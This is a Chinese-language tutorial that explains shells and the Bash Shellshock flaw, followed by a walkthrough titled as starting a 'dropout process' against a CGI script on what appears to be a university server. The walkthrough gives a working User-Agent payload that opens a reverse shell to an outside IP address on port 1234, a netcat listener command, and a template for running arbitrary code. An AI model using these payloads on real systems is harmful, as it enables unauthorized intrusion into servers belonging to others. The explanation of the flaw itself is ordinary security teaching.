基础知识

CLI & Shell

当前各种操作系统实现的人机交互接口中，最重要的两种为：CLI和GUI。

GUI（graphical user interface，图形用户接口），允许用户使用鼠标和键盘操纵屏幕上的各种视觉元素来完成和计算机的交互。

CLI（command-line interface，命令行接口），是一种通过在终端窗口中键入文本命令来实现与计算机交互的接口。

在类Unix操作系统中的CLI称为shell，在linux的各种shell实现中，使用最为广泛的是bash。

使用一下命令查看当前shell：

1echo $SHELL
2#查看当前用户的shell

Bash Shellshock漏洞

Bash自定义函数：

1#!bash
2function hello {
3 echo "Hello"
4}
5
6hello    # 调用这个函数

使用Bash特有的方法自定义函数：如果环境变量的值以字符“() {”开头，那么这个变量就会被当作是一个导入函数的定义（Export），这种定义只有在shell启动的时候才生效。

1#!bash
2$ export HELLO="() { echo 'Hello'; }"
3$ HELLO
4-bash: HELLO: command not found
5$ bash
6$ HELLO
7Hello

env命令代表“先设置下面的环境变量，再运行下面的程序”，并且执行完成后当前的环境变量不受影响。简化的测试方法：

1env HELLO="() { echo 'Hello'; }" bash -c HELLO

-c：从这个选项后边的字符串中读取命令, 并且将参数分配到位置参数中。

而这种表达方式存在漏洞，bash在处理含有函数定义诸如"() { :; }"的环境变量赋值的代码上存在设计缺陷，错误地将函数定义后面的字符串作为命令执行。

恶意命令被添加在合法环境变量之后，Bash会首先运行恶意命令，异常执行结构图示如下：

1#!bash
2env VAR='() { :;}; echo Unexpected command' bash -c "echo Real command"

开始退学流程

找到注入点：example.xjtu.edu.cn:801/cgi-bin/test.cgi

在有些CGI脚本的设计中，数据是通过环境变量来传递的，所以cgi脚本调用了bash命令。攻击者把有害数据写入环境变量，传到服务器端，触发服务器运行Bash脚本，完成攻击。以下是部分环境变量：

1SERVER_SIGNATURE=
2HTTP_USER_AGENT=Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
3SERVER_PORT=801
4HTTP_HOST=example.xjtu.edu.cn:801
5DOCUMENT_ROOT=/srun3/www/login-web
6SCRIPT_FILENAME=/srun3/www/cgi-bin/test.cgi
7REQUEST_URI=/cgi-bin/test.cgi
8SCRIPT_NAME=/cgi-bin/test.cgi

可以通过修改HTTP头的USER-AGENT字段，实现任意代码执行：

其中USER-AGENT修改为：

1() { ignored; }; echo Content-Type: text/plain ; echo ; echo;/bin/bash -i >& /dev/tcp/107.151.218.48/1234 0>&1

后面的部分可以替换为任意代码：

1() { ignored; }; echo Content-Type: text/plain ; echo ; echo;(任意代码)

在远程服务器上使用nc监听1234端口:

1nc -lp 1234
